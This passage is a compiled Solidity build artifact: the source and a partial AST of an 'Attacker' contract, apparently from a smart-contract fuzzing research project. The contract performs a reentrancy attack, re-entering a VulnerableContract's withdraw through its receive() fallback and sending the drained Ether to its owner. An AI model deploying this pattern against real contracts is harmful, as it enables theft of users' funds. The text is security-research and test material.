-;4547:25;;4591:1;4588;4585:8;4582:2;;;4596:18;;:::i;:::-;4582:2;4641:1;4638;4634:9;4626:17;;4503:146;;;;:::o;4655:96::-;;4721:24;4739:5;4721:24;:::i;:::-;4710:35;;4700:51;;;:::o;4757:126::-;;4834:42;4827:5;4823:54;4812:65;;4802:81;;;:::o;4889:77::-;;4955:5;4944:16;;4934:32;;;:::o;4972:186::-;;5089:63;5146:5;5089:63;:::i;:::-;5076:76;;5066:92;;;:::o;5164:139::-;;5273:24;5291:5;5273:24;:::i;:::-;5260:37;;5250:53;;;:::o;5309:180::-;5357:77;5354:1;5347:88;5454:4;5451:1;5444:15;5478:4;5475:1;5468:15;5495:122;5568:24;5586:5;5568:24;:::i;:::-;5561:5;5558:35;5548:2;;5607:1;5604;5597:12;5548:2;5538:79;:::o",
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\nimport \"./VulnerableContract.sol\";\r\n\r\ncontract Attacker {\r\n    VulnerableContract public vulnerable;\r\n    address public owner;\r\n    uint256 public targetAmount;  // Amount to drain\r\n    uint256 public drainedAmount;  // Amount already drained\r\n    uint256 public prevBalanceVulnerableContract;  // Amount to drain\r\n    uint256 public totalWithdraw = drainedAmount; //targetAmount - drainedAmount;\r\n\r\n    constructor(address payable _vulnerableAddress) {\r\n        vulnerable = VulnerableContract(_vulnerableAddress);\r\n        owner = msg.sender;\r\n    }\r\n\r\n    // Fallback function for reentrancy\r\n    receive() external payable {\r\n        uint256 vulnBalance = address(vulnerable).balance;\r\n        \r\n       // uint256 attackBalance = address(this).balance;\r\n        if (totalWithdraw < targetAmount && prevBalanceVulnerableContract >= vulnBalance) {\r\n            \r\n            \r\n            if (totalWithdraw > vulnBalance) {\r\n                totalWithdraw = vulnBalance;  // Cap withdrawal to remaining balance\r\n            }\r\n            //drainedAmount += amountToWithdraw;\r\n            totalWithdraw += drainedAmount;\r\n            prevBalanceVulnerableContract -= drainedAmount;\r\n            if (drainedAmount>0) {\r\n                vulnerable.withdraw(drainedAmount);\r\n              }  // Reenter to withdraw\r\n            \r\n        }\r\n    }\r\n\r\n    // Initiate the attack with a specific target amount\r\n    function attack(uint256 _targetAmount) external payable {\r\n        require(msg.value > 0, \"Need to send some Ether to attack\");\r\n        require(_targetAmount > 0, \"Target amount must be greater than 0\");\r\n        targetAmount = _targetAmount;\r\n        drainedAmount = msg.value;\r\n        \r\n\r\n        // Deposit initial amount to vulnerable contract\r\n        vulnerable.deposit{value: msg.value}();\r\n\r\n        prevBalanceVulnerableContract = address(vulnerable).balance;\r\n\r\n        // Start reentrancy attack with the initial deposit\r\n        vulnerable.withdraw(msg.value);  // Start by withdrawing the initial deposit\r\n    }\r\n\r\n    // Withdraw stolen funds\r\n    function withdrawFunds() external {\r\n        require(msg.sender == owner, \"Only owner can withdraw\");\r\n        payable(owner).transfer(address(this).balance);\r\n    }\r\n\r\n     // Function to allow the contract to receive Ether\r\n    function deposit() external payable {\r\n        // Function to handle incoming Ether\r\n    }\r\n   \r\n}\r\n",
  "sourcePath": "C:\\Users\\andri\\dev\\github\\smartcontractdrlfuz\\env1_dev2\\contracts\\Attacker.sol",
  "ast": {
    "absolutePath": "project:/contracts/Attacker.sol",
    "exportedSymbols": {
      "Attacker": [
        164
      ],
      "VulnerableContract": [
        267
      ]
    },
    "id": 165,
    "license": "MIT",
    "nodeType": "SourceUnit",
    "nodes": [
      {
        "id": 1,
        "literals": [
          "solidity",
          "^",
          "0.8",
          ".0"
        ],
        "nodeType": "PragmaDirective",
        "src": "33:23:0"
      },
      {
        "absolutePath": "project:/contracts/VulnerableContract.sol",
        "file": "./VulnerableContract.sol",
        "id": 2,
        "nodeType": "ImportDirective",
        "scope": 165,
        "sourceUnit": 268,
        "src": "60:34:0",
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "abstract": false,
        "baseContracts": [],
        "contractDependencies": [],
        "contractKind": "contract",
        "fullyImplemented": true,
        "id": 164,
        "linearizedBaseContracts": [
          164
        ],
        "name": "Attacker",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "constant": false,
            "functionSelector": "f66ad59a",
            "id": 5,
            "mutability": "mutable",
            "name": "vulnerable",
            "nodeType": "VariableDeclaration",
            "scope": 164,
            "src": "123:36:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_VulnerableContract_$267",
              "typeString": "contract VulnerableContract"
            },
            "typeName": {
              "id": 4,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 3,
                "name": "VulnerableContract",
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 267,
                "src": "123:18:0"
              },
              "referencedDeclaration": 267,
              "src": "123:18:0",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_VulnerableContract_$267",
                "typeString": "contract VulnerableContract"
              }
            },
            "visibility": "public"
          },
          {
            "constant": false,
            "functionSelector": "8da5cb5b",
            "id": 7,
            "mutability": "mutable",
            "name": "owner",
            "nodeType": "VariableDeclaration",
            "scope": 164,
            "src": "166:20:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_address",
              "typeString": "address"
            },
            "typeName": {
              "id": 6,
              "name": "address",
              "nodeType": "ElementaryTypeName",
              "src": "166:7:0",
              "stateMutability": "nonpayable",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              }
            },
            "visibility": "public"
          },
          {
            "constant": false,
            "functionSelector": "953b8fb8",
            "id": 9,
            "mutability": "mutable",
            "name": "targetAmount",
            "nodeType": "VariableDeclaration",
            "scope": 164,
            "src": "193:27:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_uint256",
              "typeString": "uint256"
            },
            "typeName": {
              "id": 8,
              "name": "uint256",
              "nodeType": "ElementaryTypeName",
              "src": "193:7:0",
              "typeDescriptions": {
                "typeIdentifier": "t_uint256",
                "typeString": "uint256"
              }
            },
            "visibility": "public"
          },
          {
            "constant": false,
            "functionSelector": "0f5ea827",
            "id": 11,
            "mutability": "mutable",
            "name": "drainedAmount",
            "nodeType": "VariableDeclaration",
            "scope": 164,
            "src": "247:28:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_uint256",
              "typeString": "uint256"
            },
            "typeName": {
              "id": 10,
              "name": "uint256",
              "nodeType": "ElementaryTypeName",
              "src": "247:7:0",
              "typeDescriptions": {
                "typeIdentifier": "t_uint256",
                "typeString": "uint256"
              }
            },
            "visibility": "public"
          },
          {
            "constant": false,
            "functionSelector": "84670062",
            "id": 13,
            "mutability": "mutable",
            "name": "prevBalanceVulnerableContract",
            "nodeType": "VariableDeclaration",
            "scope": 164,
            "src": "309:44:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_uint256",
              "typeString": "uint256"
            },
            "typeName": {
              "id": 12,
              "name": "uint256",
              "nodeType": "ElementaryTypeName",
              "src": "309:7:0",
              "typeDescriptions": {
                "typeIdentifier": "t_uint256",
                "typeString": "uint256"
              }
            },
            "visibility": "public"
          },
          {
            "constant": false,
            "functionSelector": "455fd623",
            "id": 16,
            "mutability": "mutable",
            "name": "totalWithdraw",
            "nodeType": "VariableDeclaration",
            "scope": 164,
            "src": "380:44:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_uint256",
              "typeString": "uint256"
            },
            "typeName": {
              "id": 14,
              "name": "uint256",
              "nodeType": "ElementaryTypeName",
              "src": "380:7:0",
              "typeDescriptions": {
                "typeIdentifier": "t_uint256",
                "typeString": "uint256"
              }
            },
            "value": {
              "id": 15,
              "name": "drainedAmount",
              "nodeType": "Identifier",
              "overloadedDeclarations": [],
              "referencedDeclaration": 11,
              "src": "411:13:0",
              "typeDescriptions": {
                "typeIdentifier": "t_uint256",
                "typeString": "uint256"
              }
            },
            "visibility": "public"
          },
          {
            "body": {
              "id": 32,
              "nodeType": "Block",
              "src": "513:99:0",
              "statements": [
                {
                  "expression": {
                    "id": 25,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 21,
                      "name": "vulnerable",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 5,
                      "src": "524:10:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_VulnerableContract_$267",
                        "typeString": "contract VulnerableContract"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 23,
                          "name": "_vulnerableAddress",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 18,
                          "src": "556:18:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address_payable",
                            "typeString": "address payable"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address_payable",
                            "typeString": "address payable"
                          }
                        ],
                        "id": 22,
                        "name": "VulnerableContract",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 267,
                        "src": "537:18:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_VulnerableContract_$267_$",
                          "typeString": "type(contract VulnerableContract)"
                        }
                      },
                      "id": 24,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "537:38:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_VulnerableContract_$267",
                        "typeString": "contract VulnerableContract"
                      }
                    },
                    "src": "524:51:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_VulnerableContract_$267",
                      "typeString": "contract VulnerableContract"
                    }
                  },
                  "id": 26,
                  "nodeType": "ExpressionStatement",
                  "src": "524:51:0"
                },
                {
                  "expression": {
                    "id": 30,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 27,
                      "name": "owner",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 7,
                      "src": "586:5:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "expression": {
                        "id": 28,
                        "name": "msg",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 4294967281,
                        "src": "594:3:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_magic_message",
                          "typeString": "msg"
                        }
                      },
                      "id": 29,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "sender",
                      "nodeType": "MemberAccess",
                      "src": "594:10:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "src": "586:18:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "id": 31,
                  "nodeType": "ExpressionStatement",
                  "src": "586:18:0"
                }
              ]
            },
            "id": 33,
            "implemented": true,
            "kind": "constructor",
            "modifiers": [],
            "name": "",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 19,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 18,
                  "mutability": "mutable",
                  "name": "_vulnerableAddress",
                  "nodeType": "VariableDeclaration",
                  "scope": 33,
                  "src": "477:34:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address_payable",
                    "typeString": "address payable"
                  },
                  "typeName": {
                    "id": 17,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "477:15:0",
                    "stateMutability": "payable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address_payable",
                      "typeString": "address payable"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "476:36:0"
            },
            "returnParameters": {
              "id": 20,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "513:0:0"
            },
            "scope": 164,
            "src": "465:147:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 81,
              "nodeType": "Block",
              "src": "688:717:0",
              "statements": [
                {
                  "assignments": [
                    37
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 37,
                      "mutability": "mutable",
                      "name": "vulnBalance",
                      "nodeType": "VariableDeclaration",
                      "scope": 81,
                      "src": "699:19:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 36,
                        "name": "uint256",
                        "nodeType": "ElementaryTypeName",
                        "src": "699:7:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 43,
                  "initialValue": {
                    "expression": {
                      "arguments": [
                        {
                          "id": 40,
                          "name": "vulnerable",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 5,
                          "src": "729:10:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_VulnerableContract_$267",
                            "typeString": "contract VulnerableContract"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_contract$_VulnerableContract_$267",
                            "typeString": "contract VulnerableContract"
                          }
                        ],
                        "id": 39,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "nodeType": "ElementaryTypeNameExpression",
                        "src": "721:7:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_address_$",
                          "typeString": "type(address)"
                        },
                        "typeName": {
                          "id": 38,
                          "name": "address",
                          "nodeType": "ElementaryTypeName",
                          "src": "721:7:0",
                          "typeDescriptions": {}
                        }
                      },
                      "id": 41,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "721:19:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "id": 42,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "memberName": "balance",
                    "nodeType": "MemberAccess",
                    "src": "721:27:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "699:49:0"
                },
                {
                  "condition": {
                    "commonType": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    },
                    "id": 50,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "commonType": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "id": 46,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "leftExpression": {
                        "id": 44,
                        "name": "totalWithdraw",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 16,
                        "src": "831:13:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "nodeType": "BinaryOperation",
                      "operator": "<",
                      "rightExpression": {
                        "id": 45,
                        "name": "targetAmount",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 9,
                        "src": "847:12:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "src": "831:28:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_bool",
                        "typeString": "bool"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "&&",
                    "rightExpression": {
                      "commonType": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "id": 49,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "leftExpression": {
                        "id": 47,
                        "name": "prevBalanceVulnerableContract",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 13,
                        "src": "863:29:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "nodeType": "BinaryOperation",
                      "operator": ">=",
                      "rightExpression": {
                        "id": 48,
                        "name": "vulnBalance",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 37,
                        "src": "896:11:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "src": "863:44:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_bool",
                        "typeString": "bool"
                      }
                    },
                    "src": "831:76:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 80,
                  "nodeType": "IfStatement",
                  "src": "827:571:0",
                  "trueBody": {
                    "id": 79,
                    "nodeType": "Block",
                    "src": "909:489:0",
                    "statements": [
                      {
                        "condition": {
                          "commonType": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          "id": 53,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftExpression": {
                            "id": 51,
                            "name": "totalWithdraw",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 16,
                            "src": "956:13:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "nodeType": "BinaryOperation",
                          "operator": ">",
                          "rightExpression": {
                            "id": 52,
                            "name": "vulnBalance",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 37,
                            "src": "972:11:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "src": "956:27:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_bool",
                            "typeString": "bool"
                          }
                        },
                        "id": 59,
                        "nodeType": "IfStatement",
                        "src": "952:135:0",
                        "trueBody": {
                          "id": 58,
                          "nodeType": "Block",
                          "src": "985:102:0",
                          "statements": [
                            {
                              "expression": {
                                "id": 56,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "lValueRequested": false,
                                "leftHandSide": {
                                  "id": 54,
                                  "name": "totalWithdraw",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 16,
                                  "src": "1004:13:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_uint256",
                                    "typeString": "uint256"
                                  }
                                },
                                "nodeType": "Assignment",
                                "operator": "=",
                                "rightHandSide": {
                                  "id": 55,
                                  "name": "vulnBalance",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 37,
                                  "src": "1020:11:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_uint256",
                                    "typeString": "uint256"
                                  }
                                },
                                "src": "1004:27:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_uint256",
                                  "typeString": "uint256"
                                }
                              },
                              "id": 57,
                              "nodeType": "ExpressionStatement",
                              "src": "1004:27:0"
                            }
                          ]
                        }
                      },
                      {
                        "expression": {
                          "id": 62,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftHandSide": {
                            "id": 60,
                            "name": "totalWithdraw",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 16,
                            "src": "1151:13:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "nodeType": "Assignment",
                          "operator": "+=",
                          "rightHandSide": {
                            "id": 61,
                            "name": "drainedAmount",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 11,
                            "src": "1168:13:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "src": "1151:30:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "id": 63,
                        "nodeType": "ExpressionStatement",
                        "src": "1151:30:0"
                      },
                      {
                        "expression": {
                          "id": 66,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftHandSide": {
                            "id": 64,
                            "name": "prevBalanceVulnerableContract",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 13,
                            "src": "1196:29:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "nodeType": "Assignment",
                          "operator": "-=",
                          "rightHandSide": {
                            "id": 65,
                            "name": "drainedAmount",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 11,
                            "src": "1229:13:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "src": "1196:46:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "id": 67,
                        "nodeType": "ExpressionStatement",
                        "src": "1196:46:0"
                      },
                      {
                        "condition": {
                          "commonType": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          "id": 70,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftExpression": {
                            "id": 68,
                            "name": "drainedAmount",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 11,
                            "src": "1261:13:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "nodeType": "BinaryOperation",
                          "operator": ">",
                          "rightExpression": {
                            "hexValue": "30",
                            "id": 69,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "kind": "number",
                            "lValueRequested": false,
                            "nodeType": "Literal",
                            "src": "1275:1:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_rational_0_by_1",
                              "typeString": "int_const 0"
                            },
                            "value": "0"
                          },
                          "src": "1261:15:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_bool",
                            "typeString": "bool"
                          }
                        },
                        "id": 78,
                        "nodeType": "IfStatement",
                        "src": "1257:92:0",
                        "trueBody": {
                          "id": 77,
                          "nodeType": "Block",
                          "src": "1278:71:0",
                          "statements": [
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "id": 74,
                                    "name": "drainedAmount",
                                    "nodeType": "Identifier",
                                    "overloadedDeclarations": [],
                                    "referencedDeclaration": 11,
                                    "src": "1317:13:0",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    }
                                  }
                                ],
                                "expression": {
                                  "argumentTypes": [
                                    {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    }
                                  ],
                                  "expression": {
                                    "id": 71,
                                    "name": "vulnerable",
                                    "nodeType": "Identifier",
                                    "overloadedDeclarations": [],
                                    "referencedDeclaration": 5,
                                    "src": "1297:10:0",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_contract$_VulnerableContract_$267",
                                      "typeString": "contract VulnerableContract"
                                    }
                                  },
                                  "id": 73,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": false,
                                  "lValueRequested": false,
                                  "memberName": "withdraw",
                                  "nodeType": "MemberAccess",
                                  "referencedDeclaration": 262,
                                  "src": "1297:19:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_function_external_nonpayable$_t_uint256_$returns$__$",
                                    "typeString": "function (uint256) external"
                                  }
                                },
                                "id": 75,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "kind": "functionCall",
                                "lValueRequested": false,
                                "names": [],
                                "nodeType": "FunctionCall",
                                "src": "1297:34:0",
                                "tryCall": false,
                                "typeDescriptions": {
                                  "typeIdentifier": "t_tuple$__$",
                                  "typeString": "tuple()"
                                }
                              },
                              "id": 76,
                              "nodeType": "ExpressionStatement",
                              "src": "1297:34:0"
                            }
                          ]
                        }
                      }
                    ]
                  }
                }
              ]
            },
            "id": 82,
            "implemented": true,
            "kind": "receive",
            "modifiers": [],
            "name": "",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 34,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "668:2:0"
            },
            "returnParameters": {
              "id": 35,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "688:0:0"
            },
            "scope": 164,
            "src": "661:744:0",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "body": {
              "id": 134,
              "nodeType": "Block",
              "src": "1527:570:0",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "commonType": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        "id": 91,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "expression": {
                            "id": 88,
                            "name": "msg",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 4294967281,
                            "src": "1546:3:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_message",
                              "typeString": "msg"
                            }
                          },
                          "id": 89,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "value",
                          "nodeType": "MemberAccess",
                          "src": "1546:9:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": ">",
                        "rightExpression": {
                          "hexValue": "30",
                          "id": 90,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "1558:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "src": "1546:13:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      },
                      {
                        "hexValue": "4e65656420746f2073656e6420736f6d6520457468657220746f2061747461636b",
                        "id": 92,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "1561:35:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_e2f180be35e050acd5a54fbb046a37cbdb052195a20ac5086857b2816d309170",
                          "typeString": "literal_string \"Need to send some Ether to attack\""
                        },
                        "value": "Need to send some Ether to attack"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        },
                        {
                          "typeIdentifier": "t_stringliteral_e2f180be35e050acd5a54fbb046a37cbdb052195a20ac5086857b2816d309170",
                          "typeString": "literal_string \"Need to send some Ether to attack\""
                        }
                      ],
                      "id": 87,
                      "name": "require",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        4294967278,
                        4294967278
                      ],
                      "referencedDeclaration": 4294967278,
                      "src": "1538:7:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
                        "typeString": "function (bool,string memory) pure"
                      }
                    },
                    "id": 93,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1538:59:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 94,
                  "nodeType": "ExpressionStatement",
                  "src": "1538:59:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "commonType": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        "id": 98,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "id": 96,
                          "name": "_targetAmount",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 84,
                          "src": "1616:13:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": ">",
                        "rightExpression": {
                          "hexValue": "30",
                          "id": 97,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "1632:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "src": "1616:17:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      },
                      {
                        "hexValue": "54617267657420616d6f756e74206d7573742062652067726561746572207468616e2030",
                        "id": 99,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "1635:38:0",
                        "typeDescriptions": {
